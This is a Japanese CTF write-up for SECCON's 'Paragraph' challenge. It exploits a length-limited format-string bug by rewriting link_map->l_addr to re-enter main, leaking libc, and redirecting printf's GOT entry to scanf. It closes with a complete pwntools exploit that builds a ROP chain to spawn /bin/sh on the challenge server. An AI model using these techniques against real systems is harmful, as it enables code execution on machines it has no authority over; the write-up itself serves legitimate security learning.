# Paragraph

数行のソースコードがコンパイルされたバイナリ
```c
#include <stdio.h>

int main() {
  char name[24];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("\"What is your name?\", the black cat asked.\n");
  scanf("%23s", name);
  printf(name);
  printf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", name);

  return 0;
}
```
printf()によるFSBがあり、その後もう一回printfを呼んでいる。
またscanfで読み込めるのは23bytesであるため、FSBもこの文字数の制約を受ける。

ここで配布された環境のlibc内ではscanfとprintfがかなり近い場所にあるので、printfのgot領域の下位2bytesをscanfのアドレスに書き換えた場合、
2回目のprintfで変数nameに対して%sで読み込むことができるのでBOFが引き起こせそうである。
```
$ objdump -d -M intel ./libc.so.6
...
000000000005fe00 <__isoc99_scanf@@GLIBC_2.7>:
...
00000000000600f0 <_IO_printf@@GLIBC_2.2.5>:
```
libcリークはしていないので、4bitのbruteforceで(1/16の確率)うまくprintfをscanfに書き換えることができる。

が、この解法を思いついたときにはすでにlibcリークをしながら2回目のmain関数に飛ぶことができていた。
それが以下のpayloadである。
(以下のwriteupを参考にした、見つけきてくれた@k1_zuna氏ありがとう)
https://project-euphoria.dev/problems/imaginary-ctf-2022-format-string-fun/

```
payload = b'%*38$p%8$n%33$hn' # just 16 bytes!
payload += p64(0x404ec8)[:-1]
```
上記ペイロードを送った際ののprintf実行時のstackは以下のような状況である。
(環境によって若干違うと思われるがリモートでも刺さったので主要なところは問題ないはず)

```
gef> x/40gx $rsp
0x7fffffffe100: 0x3825702438332a25      0x6e68243333256e24 <-- 6,7
0x7fffffffe110: 0x0000000000404ec8      0x00007fffffffe248 <-- 8,9
0x7fffffffe120: 0x00007fffffffe1c0      0x00007ffff7dd51ca
0x7fffffffe130: 0x00007fffffffe170      0x00007fffffffe248
0x7fffffffe140: 0x00000001003ff040      0x0000000000401196
0x7fffffffe150: 0x00007fffffffe248      0x86b8dca51a2db154
0x7fffffffe160: 0x0000000000000001      0x0000000000000000
0x7fffffffe170: 0x0000000000000000      0x00007ffff7ffd000
0x7fffffffe180: 0x86b8dca51bcdb154      0x86b8cce07aafb154
0x7fffffffe190: 0x00007fff00000000      0x0000000000000000
0x7fffffffe1a0: 0x0000000000000000      0x0000000000000001
0x7fffffffe1b0: 0x0000000000000000      0x97f079bd8aba1800
0x7fffffffe1c0: 0x00007fffffffe220      0x00007ffff7dd528b
0x7fffffffe1d0: 0x00007fffffffe258      0x00007ffff7ffe2e0 <-- 32, 33
0x7fffffffe1e0: 0x00007fff00000000      0x0000000000401196
0x7fffffffe1f0: 0x0000000000000000      0x0000000000000000
0x7fffffffe200: 0x00000000004010b0      0x00007fffffffe240 <-- 38, 39
```

'%*38\$p%8\$n'で0x4010b0(_startのアドレス)を0x0404ec8のアドレスに書き込みながら(理由は後述)、第一引数を%pで出力している。
この時のrsiはlibc内のアドレスをたまたま指しているのでlibcリークもできる。
残りの部分の'%33$hn'では0x10b0を0x7ffff7ffe2e0に書き込んでいる。
さて0x7ffff7ffe2e0には何があるかというと、_rtld_globalが指すlink_map->l_addrである。
https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/include/link.h#L95

```
gef> x/10gx &_rtld_global
0x7ffff7ffd000 <_rtld_global>:  0x00007ffff7ffe2e0      0x0000000000000004
0x7ffff7ffd010 <_rtld_global+16>:       0x00007ffff7ffe5d8      0x0000000000000000
0x7ffff7ffd020 <_rtld_global+32>:       0x00007ffff7fbd280      0x0000000000000000
0x7ffff7ffd030 <_rtld_global+48>:       0x0000000000000000      0x0000000000000001
0x7ffff7ffd040 <_rtld_global+64>:       0x0000000000000000      0x0000000000000000
gef> x/10gx 0x7ffff7ffe2e0
0x7ffff7ffe2e0: 0x0000000000000000      0x00007ffff7ffe8b8
0x7ffff7ffe2f0: 0x00000000003ff388      0x00007ffff7ffe8c0
0x7ffff7ffe300: 0x0000000000000000      0x00007ffff7ffe2e0
0x7ffff7ffe310: 0x0000000000000000      0x00007ffff7ffe8a0
0x7ffff7ffe320: 0x0000000000000000      0x00000000003ff398
```

l_addrを書き換えると何が起きるかというと、_dl_call_fini内で呼ぶfini_arrayをずらすことができる。
```
  ElfW(Dyn) *fini_array = map->l_info[DT_FINI_ARRAY];
  if (fini_array != NULL)
    {
      ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr
                                          + fini_array->d_un.d_ptr);
      size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                   / sizeof (ElfW(Addr)));

      while (sz-- > 0)
        ((fini_t) array[sz]) ();
    }
```
https://elixir.bootlin.com/glibc/glibc-2.39.9000/source/elf/dl-call_fini.c#L23

今回のfini_arrayは0x403e18なので0x10b0を足すと0x404ec8になる。
0x404ec8にはFSBで_startのアドレスを書き込んでいるので、2回目のmain関数が実行可能である。

```
$readelf -S ./chall
...
  [22] .fini_array       FINI_ARRAY       0000000000403e18  00003e18
       0000000000000008  0000000000000008  WA       0     0     8
```

2回目のmainでは先述のprintfのgot領域をscanfに変える手法を使う。
libcリークをすることにより、scanfとprintfの下位3byte目が一致しない場合を除いてexploitが刺さるようになった。
(理論上15/16の確率だが、実際には%cで出力する文字数が多すぎると失敗しているような感じがする)

```python
#!/usr/bin/python3
from pwn import *
import sys
import time

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "paragraph.seccon.games"
PORT = 5000
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
        conn = remote(HOST, PORT)
else:
        conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
got_printf = elf.got["printf"]

libc = ELF('./libc.so.6')
off_binsh = next(libc.search(b"/bin/sh"))
off_system = libc.symbols["system"]
off_printf = libc.symbols["printf"]
off_scanf = libc.symbols["__isoc99_scanf"]

off_rdi_ret = 0x0010f75b
fini_array = 0x403e18

def exploit():
        conn.recvuntil(".\n")

        payload = b'%*38$p%8$n%33$hn'
        payload += p64(0x404ec8)[:-1]

        conn.send(payload)
        conn.recvuntil("0x")
        off_gomi = 0x7ffff7f5d8c0 - 0x7ffff7dab000 # remained libc address in rsi
        addr_libc = int(conn.recv(12),16) - off_gomi

        libc_printf = addr_libc + off_printf
        libc_scanf  = addr_libc + off_scanf

        print("[+] addr_libc = "+hex(addr_libc))
        if (libc_printf & 0xff0000) != (libc_scanf & 0xff0000):
                print("[-] fail")
                exit(1)

        payload = b''
        lower_2 = libc_scanf&0xffff
        payload += f'%{lower_2}c%8$hn'.encode()
        payload += b'x'*(16-len(payload))
        payload += p64(got_printf)[:-1]
        conn.recvuntil(".\n")
        conn.send(payload)

        fmt = b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted "
        fmt += b'x'*0x28
        fmt += p64(addr_libc+off_rdi_ret+1)
        fmt += p64(addr_libc+off_rdi_ret)
        fmt += p64(addr_libc+off_binsh)
        fmt += p64(addr_libc+off_system)
        fmt += b" warmly.\n\x00"
        conn.recvuntil("(@@")
        conn.send(fmt)

        conn.interactive()

if __name__ == "__main__":
        exploit()

```
